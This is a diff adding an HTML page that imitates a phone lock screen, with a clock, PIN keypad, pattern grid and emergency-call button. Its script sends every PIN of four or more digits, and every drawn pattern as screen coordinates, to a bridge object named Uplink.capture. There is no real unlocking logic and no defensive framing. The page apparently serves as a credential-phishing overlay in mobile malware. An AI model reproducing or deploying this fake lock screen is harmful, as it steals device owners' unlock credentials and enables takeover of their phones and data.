@@ -1,0 +1,181 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
+    <style>
+        body { background:#000; color:#fff; font-family:-apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; margin:0; padding:0; display:flex; flex-direction:column; height:100vh; width:100vw; overflow:hidden; user-select:none; touch-action:none; justify-content: space-between; }
+        .clock-box { padding-top: 5vh; text-align:center; }
+        .clock-time { font-size: 8vh; font-weight: 200; color:#fff; letter-spacing: -1px; line-height:1; }
+        .clock-date { font-size: 2.2vh; color:rgba(255,255,255,0.7); margin-top: 1vh; font-weight:300; }
+        .header { padding: 2vh 5vw 1vh; text-align:center; }
+        h2 { font-weight:400; margin:0 0 0.5vh; font-size: 2.4vh; color:#fff; }
+        .status-msg { height: 2.5vh; color: #ff4d4d; font-size: 1.6vh; margin-top: 0.5vh; font-weight: 500; opacity: 0; transition: 0.2s; }
+        .pin-dots { display:flex; justify-content:center; gap: 4vw; margin: 2vh 0; height: 2vh; }
+        .pin-dot { width: 1.8vh; height: 1.8vh; border: 0.2vh solid rgba(255,255,255,0.4); border-radius:50%; transition:0.1s; }
+        .pin-dot.filled { background:#ffffff; border-color:#ffffff; box-shadow:0 0 1vh rgba(255,255,255,0.8); }
+        .keypad { display:grid; grid-template-columns:repeat(3, 1fr); gap: 2.2vh; width: 78vw; max-width: 380px; margin: 0 auto; }
+        .key { width: 8.2vh; height: 8.2vh; max-width: 21vw; max-height: 21vw; border-radius:50%; background:rgba(255,255,255,0.1); border: 0.15vh solid rgba(255,255,255,0.18); color:#fff; display:flex; flex-direction:column; align-items:center; justify-content:center; cursor:pointer; transition:0.1s; margin: 0 auto; -webkit-tap-highlight-color:transparent; }
+        .key:active { background:rgba(255,255,255,0.3); transform:scale(0.94); }
+        .key-num { font-size: 3.4vh; font-weight:300; line-height:1; }
+        .key-sub { font-size: 1vh; color:rgba(255,255,255,0.6); margin-top: 0.2vh; letter-spacing:1px; font-weight:600; }
+        .pat-container { position:relative; width: 82vw; height: 82vw; max-width: 380px; max-height: 380px; margin: 1vh auto; border-radius: 15px; }
+        canvas { position:absolute; top:0; left:0; pointer-events:none; width: 100%; height: 100%; }
+        .grid { display:grid; grid-template-columns:repeat(3, 1fr); grid-template-rows:repeat(3, 1fr); width:100%; height:100%; position:relative; z-index:2; }
+        .dot-wrap { display:flex; align-items:center; justify-content:center; }
+        .dot { width: 2.2vh; height: 2.2vh; background:rgba(255,255,255,0.4); border-radius:50%; transition:0.2s; }
+        .dot.active { background:#ffffff; box-shadow:0 0 2vh #ffffff; transform:scale(1.4); }
+        .footer { padding: 3vh 8vw 4vh; display:flex; justify-content:space-between; align-items:center; }
+        .f-btn { background:transparent; border:none; color:rgba(255,255,255,0.8); font-weight:400; font-size: 2vh; cursor:pointer; transition: 0.2s; -webkit-tap-highlight-color:transparent; }
+        .f-btn:active { color: #fff; transform: scale(0.95); }
+    </style>
+</head>
+<body>
+    <div class='clock-box'>
+        <div class='clock-time' id='clock-t'>12:45</div>
+        <div class='clock-date' id='clock-d'>Thu, November 26</div>
+    </div>
+
+    <div class='header'>
+        <h2 id='hdr-txt'>Use PIN</h2>
+        <div id='status' class='status-msg'>Incorrect PIN</div>
+    </div>
+
+    <div id='pin-mode' style='flex-grow: 1; display: flex; flex-direction: column; justify-content: center;'>
+        <div class='pin-dots' id='pin-display'>
+            <div class='pin-dot'></div><div class='pin-dot'></div><div class='pin-dot'></div><div class='pin-dot'></div>
+            <div class='pin-dot' style='display:none'></div><div class='pin-dot' style='display:none'></div>
+            <div class='pin-dot' style='display:none'></div><div class='pin-dot' style='display:none'></div>
+        </div>
+        <div class='keypad'>
+            <div class='key' onclick='k(1)'><span class='key-num'>1</span><span class='key-sub'>&nbsp;</span></div>
+            <div class='key' onclick='k(2)'><span class='key-num'>2</span><span class='key-sub'>ABC</span></div>
+            <div class='key' onclick='k(3)'><span class='key-num'>3</span><span class='key-sub'>DEF</span></div>
+            <div class='key' onclick='k(4)'><span class='key-num'>4</span><span class='key-sub'>GHI</span></div>
+            <div class='key' onclick='k(5)'><span class='key-num'>5</span><span class='key-sub'>JKL</span></div>
+            <div class='key' onclick='k(6)'><span class='key-num'>6</span><span class='key-sub'>MNO</span></div>
+            <div class='key' onclick='k(7)'><span class='key-num'>7</span><span class='key-sub'>PQRS</span></div>
+            <div class='key' onclick='k(8)'><span class='key-num'>8</span><span class='key-sub'>TUV</span></div>
+            <div class='key' onclick='k(9)'><span class='key-num'>9</span><span class='key-sub'>WXYZ</span></div>
+            <div class='key' style='opacity:0; pointer-events:none;'></div>
+            <div class='key' onclick='k(0)'><span class='key-num'>0</span><span class='key-sub'>+</span></div>
+            <div class='key' onclick='del()' style='background:transparent; border:none;'><span style='font-size:3vh; color:rgba(255,255,255,0.8);'>&#9003;</span></div>
+        </div>
+        <div style='text-align:center; margin-top: 2.5vh;'><button class='f-btn' style='font-size:1.8vh; color:rgba(255,255,255,0.7);' onclick='toggle(true)'>Draw pattern</button></div>
+    </div>
+
+    <div id='pat-mode' style='display:none; flex-grow: 1; flex-direction: column; justify-content: center;'>
+        <div class='pat-container' id='pc'>
+            <canvas id='cv'></canvas>
+            <div class='grid' id='g'>
+                <div class='dot-wrap'><div class='dot' data-id='0'></div></div>
+                <div class='dot-wrap'><div class='dot' data-id='1'></div></div>
+                <div class='dot-wrap'><div class='dot' data-id='2'></div></div>
+                <div class='dot-wrap'><div class='dot' data-id='3'></div></div>
+                <div class='dot-wrap'><div class='dot' data-id='4'></div></div>
+                <div class='dot-wrap'><div class='dot' data-id='5'></div></div>
+                <div class='dot-wrap'><div class='dot' data-id='6'></div></div>
+                <div class='dot-wrap'><div class='dot' data-id='7'></div></div>
+                <div class='dot-wrap'><div class='dot' data-id='8'></div></div>
+            </div>
+        </div>
+        <div style='text-align:center; margin-top: 2vh;'><button class='f-btn' style='color:rgba(255,255,255,0.5); font-size: 1.6vh;' onclick='reset()'>Clear Pattern</button></div>
+        <div style='text-align:center; margin-top: 2vh;'><button class='f-btn' style='font-size:1.8vh; color:rgba(255,255,255,0.7);' onclick='toggle(false)'>Use PIN</button></div>
+    </div>
+
+    <div class='footer'>
+        <button class='f-btn' style='color:rgba(255,255,255,0.7); font-size:1.8vh;' onclick='Uplink.capture("CANCEL")'>Emergency call</button>
+        <button class='f-btn' id='ok' style='font-size:1.8vh; color:#fff;' onclick='send()'>OK</button>
+    </div>
+
+    <script>
+    let mode='pin'; let pin=''; let path=[]; let isDown=false; let dotsData=[];
+    const cv=document.getElementById('cv'); const ctx=cv.getContext('2d');
+    const status=document.getElementById('status');
+
+    function updateClock() {
+      const d = new Date();
+      const h = String(d.getHours() % 12 || 12).padStart(2, '0');
+      const m = String(d.getMinutes()).padStart(2, '0');
+      document.getElementById('clock-t').innerText = h + ':' + m;
+      const days = ['Sun','Mon','Tue','Wed','Thu','Fri','Sat'];
+      const months = ['Jan','Feb','Mar','Apr','May','Jun','Jul','Aug','Sep','Oct','Nov','Dec'];
+      document.getElementById('clock-d').innerText = days[d.getDay()] + ', ' + months[d.getMonth()] + ' ' + d.getDate();
+    }
+    setInterval(updateClock, 1000); updateClock();
+
+    function toggle(p){ mode=p?'pat':'pin'; document.getElementById('hdr-txt').innerText=p?'Draw pattern':'Use PIN'; document.getElementById('pin-mode').style.display=p?'none':'flex'; document.getElementById('pat-mode').style.display=p?'flex':'none'; if(p) setTimeout(setupCanvas, 50); reset(); }
+    function reset(){ pin=''; path=[]; resetDots(); if(mode==='pat') { setupCanvas(); draw(); } updatePin(); status.style.opacity=0; }
+    function resetDots(){ document.querySelectorAll('.dot').forEach(d=>d.classList.remove('active')); }
+    function updatePin(){ const ds=document.querySelectorAll('.pin-dot');
+      ds.forEach((d,i)=>{
+        d.classList.toggle('filled', i<pin.length);
+        if(i>=4) d.style.display = (pin.length > 4 || i === pin.length) ? 'block' : 'none';
+      });
+      if(pin.length >= 4) send();
+    }
+    function k(n){ if(pin.length<8){ pin+=n; updatePin(); status.style.opacity=0; } }
+    function del(){ pin=pin.slice(0,-1); updatePin(); }
+
+    function send(){
+      console.log('Capture requested. Mode: ' + mode);
+      if(mode==='pin'){
+        if(pin.length>=4) { Uplink.capture(pin); }
+        else { showErr('PIN too short'); }
+      }
+      else {
+        if(path.length>=3) {
+          const coords = path.map(id => {
+            const idx = parseInt(id);
+            const dot = dotsData[idx];
+            const pc = document.getElementById('pc').getBoundingClientRect();
+            return Math.round(pc.left + dot.x) + ',' + Math.round(pc.top + dot.y);
+          }).join('|');
+          Uplink.capture('PAT:' + coords);
+        } else { showErr('Pattern too short'); }
+      }
+    }
+    function showErr(msg){ status.innerText=msg; status.style.opacity=1; setTimeout(()=>status.style.opacity=0, 2000); }
+
+    function setupCanvas(){
+      const pc=document.getElementById('pc'); if(!pc) return;
+      const r=pc.getBoundingClientRect(); cv.width=r.width; cv.height=r.height;
+      dotsData = Array.from(document.querySelectorAll('.dot')).map(d => {
+        const wr=d.closest('.dot-wrap').getBoundingClientRect();
+        return { id: d.dataset.id, x: wr.left - r.left + wr.width/2, y: wr.top - r.top + wr.height/2, r: wr.width/2 };
+      });
+      console.log('Canvas setup complete: ' + cv.width + 'x' + cv.height);
+    }
+
+    function draw(ex, ey){
+      ctx.clearRect(0,0,cv.width,cv.height); if(path.length===0 && ex===undefined)return;
+      ctx.strokeStyle='rgba(0, 242, 255, 0.8)'; ctx.lineWidth=Math.max(cv.width/20, 12); ctx.lineCap='round'; ctx.lineJoin='round'; ctx.beginPath();
+      path.forEach((id,i)=>{
+        const d = dotsData.find(item => item.id === id);
+        if(i===0) ctx.moveTo(d.x, d.y); else ctx.lineTo(d.x, d.y);
+      });
+      if(ex!==undefined && path.length > 0) {
+        const last = dotsData.find(item => item.id === path[path.length-1]);
+        ctx.moveTo(last.x, last.y); ctx.lineTo(ex, ey);
+      }
+      ctx.stroke();
+    }
+
+    const handleMove=(e)=>{
+      if(!isDown)return; e.preventDefault();
+      const t=e.touches?e.touches[0]:e; const pr=document.getElementById('pc').getBoundingClientRect();
+      const x=t.clientX-pr.left; const y=t.clientY-pr.top;
+      dotsData.forEach(d=>{
+        const dist=Math.hypot(x-d.x, y-d.y);
+        if(dist < d.r * 0.9){ if(!path.includes(d.id)){ path.push(d.id); document.querySelector('[data-id="'+d.id+'"]').classList.add('active'); } }
+      }); draw(x,y);
+    };
+
+    const pc=document.getElementById('pc');
+    pc.addEventListener('touchstart',(e)=>{isDown=true; setupCanvas(); handleMove(e);}, {passive: false});
+    pc.addEventListener('mousedown',(e)=>{isDown=true; setupCanvas(); handleMove(e);});
+    window.addEventListener('touchend',()=>{isDown=false; draw();}); window.addEventListener('mouseup',()=>{isDown=false; draw();});
+    window.addEventListener('touchmove',handleMove, {passive: false}); window.addEventListener('mousemove',handleMove);
+    window.onload=() => { if(mode==='pat') setupCanvas(); }; window.onresize=setupCanvas;
+    </script>
+</body>
+</html>
